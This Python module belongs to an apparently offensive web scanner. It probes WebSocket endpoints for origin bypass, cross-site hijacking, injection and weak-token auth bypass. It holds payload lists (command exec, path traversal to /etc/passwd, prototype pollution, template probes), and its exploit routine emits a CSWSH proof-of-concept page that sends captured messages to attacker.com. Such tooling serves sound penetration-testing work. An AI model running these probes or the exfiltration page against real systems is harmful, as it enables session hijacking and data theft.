import re
import json
import asyncio
import base64
import struct
import hashlib
from typing import Dict, List, Set, Optional, Tuple
from urllib.parse import urlparse, urljoin, parse_qs
from modules.base import BaseModule


class WebsocketModule(BaseModule):
    name = "websocket"
    description = "WebSocket Security Scanner"
    exploitable = True
    
    injection_payloads = [
        '{"type":"ping"}',
        '{"action":"subscribe","channel":"*"}',
        '{"cmd":"exec","data":"id"}',
        '{"query":"SELECT * FROM users"}',
        '<script>alert(1)</script>',
        '../../../etc/passwd',
        '{"__proto__":{"admin":true}}',
        '{"$where":"this.password.match(/.*/)"}',
        '${7*7}',
        '{{7*7}}',
    ]
    
    binary_payloads = [
        b'\x00\x00\x00\x00',
        b'\xff\xff\xff\xff',
        b'\x41' * 1000,
        b'\x00' * 100,
        b'\x89PNG\r\n\x1a\n',
    ]
    
    protocol_tests: List[Tuple[str, str]] = [
        ("", "Empty frame"),
        ("\x00", "Null byte"),
        ("\r\n" * 100, "CRLF flood"),
        ("A" * 65536, "Large payload"),
        ('{"a":' + '{"b":' * 100 + '1' + '}' * 100 + '}', "Deep nesting"),
    ]
    
    async def scan(self, target: str):
        self.findings = []
        self.ws_endpoints: Set[str] = set()
        self.vulnerable_endpoints: List[Dict] = []
        
        endpoints = await self._find_websocket_endpoints(target)
        self.ws_endpoints = set(endpoints)
        
        if endpoints:
            self.add_finding(
                "INFO",
                f"Found {len(endpoints)} WebSocket endpoint(s)",
                url=target,
                evidence=", ".join(list(endpoints)[:5])
            )
            
            for ws_url in list(endpoints)[:5]:
                await self._test_origin_validation(ws_url, target)
                await self._test_cswsh(ws_url, target)
                await self._test_message_injection(ws_url)
                await self._test_binary_handling(ws_url)
                await self._test_protocol_fuzzing(ws_url)
                await self._test_auth_bypass(ws_url, target)
        
        return self.findings
    
    async def _find_websocket_endpoints(self, target: str) -> List[str]:
        endpoints: Set[str] = set()
        
        resp = await self.http.get(target)
        if not resp.get("status"):
            return list(endpoints)
        
        text = resp.get("text", "")
        
        ws_patterns = [
            r'wss?://[^\s\'"<>]+',
            r'new\s+WebSocket\s*\(\s*[\'"]([^\'"]+)',
            r'socket\.io',
            r'sockjs',
            r'[\'"]([^\'"]*(?:socket|ws|websocket)[^\'"]*)[\'"]',
        ]
        
        for pattern in ws_patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                ws_url = self._normalize_ws_url(match, target)
                if ws_url:
                    endpoints.add(ws_url)
        
        parsed = urlparse(target)
        common_paths = [
            "/ws", "/websocket", "/socket", "/socket.io/",
            "/sockjs/", "/realtime", "/live", "/stream",
            "/api/ws", "/api/websocket", "/v1/ws", "/v2/ws",
            "/graphql", "/subscriptions", "/events", "/notifications",
        ]
        
        ws_scheme = "wss" if parsed.scheme == "https" else "ws"
        for path in common_paths:
            endpoints.add(f"{ws_scheme}://{parsed.netloc}{path}")
        
        return list(endpoints)
    
    def _normalize_ws_url(self, match: str, target: str) -> Optional[str]:
        if match.startswith("ws://") or match.startswith("wss://"):
            return match
        
        if "socket" in match.lower() or "/" in match:
            parsed = urlparse(target)
            ws_scheme = "wss" if parsed.scheme == "https" else "ws"
            path = match if match.startswith("/") else f"/{match}"
            return f"{ws_scheme}://{parsed.netloc}{path}"
        
        return None
    
    async def _test_origin_validation(self, ws_url: str, origin_target: str):
        http_url = ws_url.replace("wss://", "https://").replace("ws://", "http://")
        
        evil_origins = [
            "https://evil.com",
            "https://attacker.evil.com",
            "null",
            "",
            f"https://{urlparse(origin_target).netloc}.evil.com",
            f"https://evil.{urlparse(origin_target).netloc}",
        ]
        
        for origin in evil_origins:
            headers = self._build_ws_headers(origin if origin else None)
            
            resp = await self.http.get(http_url, headers=headers)
            
            if resp.get("status") == 101:
                self.add_finding(
                    "CRITICAL",
                    f"WebSocket Origin Bypass: {origin or 'null/empty'}",
                    url=ws_url,
                    evidence=f"Origin '{origin}' accepted for WebSocket upgrade"
                )
                
                self.vulnerable_endpoints.append({
                    "url": ws_url,
                    "type": "origin_bypass",
                    "origin": origin,
                })
                
                self.record_success(f"origin:{origin}", ws_url)
                break
    
    async def _test_cswsh(self, ws_url: str, origin_target: str):
        http_url = ws_url.replace("wss://", "https://").replace("ws://", "http://")
        parsed = urlparse(origin_target)
        
        subdomains = [
            f"test.{parsed.netloc}",
            f"www.{parsed.netloc}",
            f"api.{parsed.netloc}",
            f"admin.{parsed.netloc}",
        ]
        
        for subdomain in subdomains:
            origin = f"https://{subdomain}"
            headers = self._build_ws_headers(origin)
            
            resp = await self.http.get(http_url, headers=headers)
            
            if resp.get("status") == 101:
                if subdomain != parsed.netloc:
                    self.add_finding(
                        "HIGH",
                        f"Cross-Site WebSocket Hijacking via subdomain",
                        url=ws_url,
                        evidence=f"Origin {origin} accepted (subdomain takeover risk)"
                    )
    
    async def _test_message_injection(self, ws_url: str):
        http_url = ws_url.replace("wss://", "https://").replace("ws://", "http://")
        
        for payload in self.injection_payloads:
            encoded = base64.b64encode(payload.encode()).decode()
            
            headers = self._build_ws_headers(None)
            headers["X-Test-Payload"] = encoded[:50]
            
            try:
                payload_json = json.loads(payload)
                payload_data = json.dumps(payload_json)
            except (json.JSONDecodeError, TypeError):
                payload_data = payload
            
            resp = await self.http.post(
                http_url,
                data=payload_data,
                headers={"Content-Type": "application/json"}
            )
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                if any(ind in text.lower() for ind in ["error", "exception", "stack", "trace"]):
                    self.add_finding(
                        "MEDIUM",
                        "WebSocket injection causes error disclosure",
                        url=ws_url,
                        evidence=f"Payload: {payload[:30]}..."
                    )
                    self.record_success(payload, ws_url)
                
                if "49" in text or "${" in text or "{{" in text:
                    self.add_finding(
                        "HIGH",
                        "Potential template injection in WebSocket",
                        url=ws_url,
                        evidence=f"Payload: {payload[:30]}..."
                    )
    
    async def _test_binary_handling(self, ws_url: str):
        http_url = ws_url.replace("wss://", "https://").replace("ws://", "http://")
        
        for binary_data in self.binary_payloads:
            packed = struct.pack(">I", len(binary_data)) + binary_data
            
            headers = {
                "Content-Type": "application/octet-stream",
                "Content-Length": str(len(packed)),
            }
            
            try:
                resp = await self.http.post(http_url, data=packed, headers=headers)
                
                if resp.get("status") == 500:
                    self.add_finding(
                        "MEDIUM",
                        "WebSocket binary handling causes server error",
                        url=ws_url,
                        evidence=f"Binary payload length: {len(binary_data)}"
                    )
            except Exception:
                pass
    
    async def _test_protocol_fuzzing(self, ws_url: str):
        http_url = ws_url.replace("wss://", "https://").replace("ws://", "http://")
        
        for payload, description in self.protocol_tests:
            try:
                resp = await self.http.post(
                    http_url,
                    data=payload,
                    headers={"Content-Type": "text/plain"},
                    timeout=5
                )
                
                if resp.get("status") == 500:
                    self.add_finding(
                        "MEDIUM",
                        f"WebSocket protocol fuzzing: {description}",
                        url=ws_url,
                        evidence="Server error on malformed input"
                    )
            except asyncio.TimeoutError:
                self.add_finding(
                    "LOW",
                    f"WebSocket timeout on: {description}",
                    url=ws_url,
                    evidence="Potential DoS vector"
                )
            except Exception:
                pass
    
    async def _test_auth_bypass(self, ws_url: str, target: str):
        http_url = ws_url.replace("wss://", "https://").replace("ws://", "http://")
        parsed = urlparse(target)
        query_params = parse_qs(parsed.query)
        
        auth_tokens = ["", "null", "undefined", "admin", "test", "guest"]
        
        for token in auth_tokens:
            test_url = urljoin(http_url, f"?token={token}")
            headers = self._build_ws_headers(f"https://{parsed.netloc}")
            
            resp = await self.http.get(test_url, headers=headers)
            
            if resp.get("status") == 101:
                self.add_finding(
                    "CRITICAL",
                    f"WebSocket auth bypass with token: {token}",
                    url=test_url,
                    evidence="Weak/missing token validation"
                )
                
                self.vulnerable_endpoints.append({
                    "url": ws_url,
                    "type": "auth_bypass",
                    "token": token,
                })
                break
    
    def _build_ws_headers(self, origin: Optional[str] = None) -> Dict[str, str]:
        key = base64.b64encode(hashlib.sha1(b"lantern-test").digest()[:16]).decode()
        
        headers = {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": key,
            "Sec-WebSocket-Version": "13",
        }
        
        if origin is not None:
            headers["Origin"] = origin
        
        return headers
    
    def _compute_accept_key(self, key: str) -> str:
        magic = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
        combined = key + magic
        sha1_hash = hashlib.sha1(combined.encode()).digest()
        return base64.b64encode(sha1_hash).decode()
    
    async def exploit(self, target: str, finding: Dict):
        results = {
            "hijacked_sessions": [],
            "extracted_data": [],
        }
        
        for vuln in self.vulnerable_endpoints:
            if vuln["type"] == "origin_bypass":
                poc = self._generate_cswsh_poc(vuln["url"], vuln["origin"])
                results["hijacked_sessions"].append({
                    "url": vuln["url"],
                    "poc_html": poc,
                })
                
                self.add_exploit_data("cswsh_poc", poc)
        
        return results
    
    def _generate_cswsh_poc(self, ws_url: str, origin: str) -> str:
        poc = f'''<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<script>
var ws = new WebSocket("{ws_url}");
ws.onopen = function() {{
    console.log("Connected to victim WebSocket");
    ws.send(JSON.stringify({{action: "get_user_data"}}));
}};
ws.onmessage = function(e) {{
    console.log("Stolen data:", e.data);
    new Image().src = "https://attacker.com/log?data=" + encodeURIComponent(e.data);
}};
</script>
</body>
</html>'''
        return poc
    
    def get_endpoints(self) -> Set[str]:
        return self.ws_endpoints
